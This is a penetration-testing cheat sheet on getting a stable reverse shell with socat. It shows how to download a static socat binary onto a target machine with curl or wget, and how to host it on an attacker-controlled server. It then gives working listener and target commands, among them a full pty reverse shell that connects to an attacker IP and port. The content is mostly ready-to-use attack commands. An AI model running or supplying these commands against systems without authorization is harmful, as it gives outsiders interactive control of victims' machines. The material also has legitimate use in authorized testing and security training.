# socat

### Stable shell

Using basic methods such as netcat will generate a shell that might not be stable: terminates with ctrl+Z, non-interactive shell, etc. Alternative methods are available:

Socat is generally more stable on Linux systems compared to Windows (target machine). As socat might not be installed on all target Linux systems, it will need to be installed. However, the common method of using `apt install` or `apt-get install` is not ideal as it requires multiple dependencies and other possible configurations.&#x20;

Instead, a static compiled binary (without dependencies) can be installed from a direct HTTP URL on the target machine using tools such as `curl` or `wget`. Link: [https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

```bash
$ curl https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true --output /bin/socat
```

```bash
$ wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true -O /bin/socat
```



_**Note**_: The output directory depends on a few factors such as the current working directory, or the value of the `$SHELL`environment variable. This is important to ensure the installed binary can be executed from the target machine.

#### Hosting the binary on a publicly accessible attacker-controlled machine

The binary can also be hosted on another attacker-controlled machine on the internet, and be accessed via a simple Python web server running on that machine.

### Reverse shell

#### Basic command to run on the attacker machine (listening)

```bash
$ socat tcp-l:[listen_port] -
```

#### Basic command to run on the target machine (initiate revere shell connection)

```bash
$ socat tcp:[attacker_ip]:[attacker_port] EXEC:"bash -li"
```

### Best reverse shell experience

Target machine

```bash
$ socat TCP:10.0.22.4:8888 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

Attacker machine

```bash
$ socat tcp-l:8888 -
```
